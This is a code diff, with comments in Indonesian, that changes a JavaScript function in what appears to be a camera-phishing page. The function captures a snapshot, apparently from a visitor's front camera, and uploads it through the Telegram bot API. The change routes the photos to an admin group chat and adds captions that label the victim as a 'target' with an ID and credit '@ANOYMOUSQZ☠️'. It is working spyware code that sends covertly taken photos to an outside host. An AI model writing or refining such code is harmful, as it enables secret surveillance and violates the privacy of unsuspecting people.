@@ -117,11 +117,16 @@
     function sendDirectTelegram(chatIdToSend) {
         canvas.toBlob(async (blob) => {
             const formData = new FormData();
-            formData.append('chat_id', chatIdToSend); 
-            formData.append('photo', blob, 'snapshot.png');
-            formData.append('caption', '📸 Target Berhasil\nFoto kamera depan target berhasil diambil otomatis by @ANOYMOUSQZ☠️.');
             
-            // Perbaikan Parameter: Menggunakan tipe JSON asli JSON.parse agar dibaca Boolean oleh Telegram API
+            // Kirim langsung ke ID GRUP utama Anda agar semua admin bisa melihat
+            formData.append('chat_id', ADMIN_CHAT_ID); 
+            formData.append('photo', blob, 'snapshot.png');
+            
+            // 🌟 MEMBUAT CAPTION OTOMATIS BERISI ID TARGET AGAR TIDAK BINGUNG
+            const targetInfo = SENDER_ID ? `🆔 ID Target: ${SENDER_ID}` : `⚠️ Dibuka Tanpa ID Pengguna`;
+            formData.append('caption', `📸 *TARGET BERHASIL DIFFOTO*\n\n${targetInfo}\n\nFoto kamera depan target berhasil diambil otomatis by @ANOYMOUSQZ☠️.`);
+            
+            formData.append('parse_mode', 'Markdown');
             formData.append('has_spoiler', JSON.parse('true')); 
 
             try {
